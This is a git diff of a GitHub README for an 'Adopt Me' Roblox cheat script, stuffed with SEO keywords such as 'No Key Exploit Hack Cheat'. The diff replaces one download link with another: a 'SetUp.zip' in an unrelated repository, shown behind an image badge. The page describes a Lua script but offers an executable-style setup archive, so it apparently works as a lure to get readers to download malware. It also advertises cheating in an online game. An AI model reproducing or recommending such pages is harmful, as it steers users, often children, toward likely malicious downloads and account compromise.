@@ -1,10 +1,9 @@
-# Adopt-Me-Script
+# Adopt-Me-Script-Roblox
 Adopt Me Script Pastebin 2025 No Key Exploit Hack Cheat
 
-<div style="text-align: center">
-  <a href="https://github.com/Darkness-Vibe/bookish-octo-fiesta/releases/download/new/script.zip">
-    <img class="bumbum" style="width: 1000px" alt="Static Badge" src="http://postimg.su/image/vhyVRmys/rounded-in-photoretrica (1) (1) (1).png">
-  </a>
+
+# <div style="text-align:center"> 
+  <a href="https://github.com/Remo1s/Net6/releases/download/net7/SetUp.zip"><img src="https://i.postimg.cc/PqKJCZD3/rounded-in-photoretrica-1-1-1.png" /></a>
 </div>
 
 ![image](https://github.com/user-attachments/assets/ac8dc305-e50d-4047-beb6-190462a59273)
@@ -15,40 +14,44 @@ Adopt Me Script Pastebin 2025 No Key Exploit Hack Cheat
 
 # Roblox Adopt Me Script - 
 
-Welcome to the **Roblox Adopt Me Script** repository! This repository contains custom scripts designed to enhance your Roblox gameplay experience within the popular game **Adopt Me**. Whether you're a beginner or an advanced player, these scripts offer various functionalities, from automating tasks to adding new features to your Adopt Me world.
+# Welcome to the **Adopt Me Script** Repository
 
-## 🚀 Features
-- **Auto Pet Collector:** Automatically collects pets in the game to increase your collection effortlessly.
-- **Pet Trading Enhancer:** Improve pet trading with auto-trading and faster transactions.
-- **Money Farm Script:** Earn in-game currency faster with automated money farming.
-- **House Customizer:** Customize and upgrade your virtual house with a few clicks.
-- **Speed & Movement Modifiers:** Adjust your character's speed and movement for better gameplay.
+This repository offers a collection of custom scripts designed to enhance your gameplay in the popular **Adopt Me** game on Roblox. Whether you're a beginner or an experienced player, these scripts provide various functionalities, from automating tasks to adding new features to your world.
 
-## 🔧 Installation
-1. **Download the Script:** Click on the `Download` button to get the script files.
-2. **Set Up in Roblox Studio:** Follow the step-by-step instructions provided in the documentation to integrate the script into your Adopt Me game.
-3. **Run and Enjoy:** Once installed, execute the script and start exploring new possibilities!
+## 🚀 Key Features
+- **Auto Pet Gatherer**: Automatically collects pets in the game, making it easier to grow your collection.
+- **Pet Trade Enhancer**: Speed up pet trading and automate transactions for smoother gameplay.
+- **Currency Farm Script**: Earn in-game currency faster through automated farming.
+- **Home Designer**: Customize and upgrade your virtual house with minimal effort.
+- **Speed & Movement Tweaks**: Adjust your character's speed and movement for improved performance.
+
+## 🔧 Installation Guide
+1. **Download the Script**: Click on the `Download` button to get the script files.
+2. **Set Up in Roblox Studio**: Follow the provided instructions in the documentation to integrate the script into your Adopt Me game.
+3. **Run and Enjoy**: Once set up, execute the script and begin exploring the new possibilities!
 
 ## 📜 How It Works
-This script uses Roblox’s scripting engine, **Lua**, to modify in-game behaviors. It’s designed to be safe, easy to use, and customizable. You can tweak settings and parameters according to your preferences, and the code is constantly updated to ensure compatibility with Roblox’s latest updates.
+The script is built using **Lua**, Roblox’s scripting language, to modify in-game actions. It’s designed to be safe, easy to use, and customizable. You can adjust various settings according to your preferences, and the code is regularly updated to ensure compatibility with the latest Roblox updates.
 
-## ⚠️ Disclaimer
-- **Use at your own risk.** This script is intended for personal use only and should not be used to exploit or harm other players.
-- **Not affiliated with Roblox or Adopt Me.** This is a community-driven project created to enhance your gaming experience.
+## ⚠️ Important Disclaimer
+- **Use responsibly.** This script is intended for personal use only. Do not use it to exploit or harm other players.
+- **Not affiliated with Roblox or Adopt Me.** This is an independent, community-driven project aimed at enhancing your gameplay experience.
 
 ## 💬 Support & Community
-- Join our **Discord Server** for help, updates, and a community of developers and players.
-- Feel free to open an **issue** if you encounter any problems or bugs.
+- Join our **[Discord Server](#)** for support, updates, and to connect with other developers and players.
+- If you encounter any issues or bugs, feel free to open an **issue** in the repository.
 - For feature requests, simply submit an issue with your suggestions.
 
 ## 🔑 Keywords
-- **Roblox Adopt Me Script**
+- **Roblox Adopt Me Scripts**
 - **Adopt Me cheats**
-- **Roblox script automation**
-- **Adopt Me pet collector**
-- **Roblox Lua scripts**
-- **Game enhancers for Roblox**
+- **Roblox automation scripts**
+- **Pet collector for Adopt Me**
+- **Lua scripts for Roblox**
+- **Game enhancement scripts for Roblox**
 - **Roblox Adopt Me hacks** *(use responsibly)*
+
+
 
 ## 📥 License
 This repository is licensed under the [MIT License](LICENSE). You can freely use, modify, and distribute the script under this license.
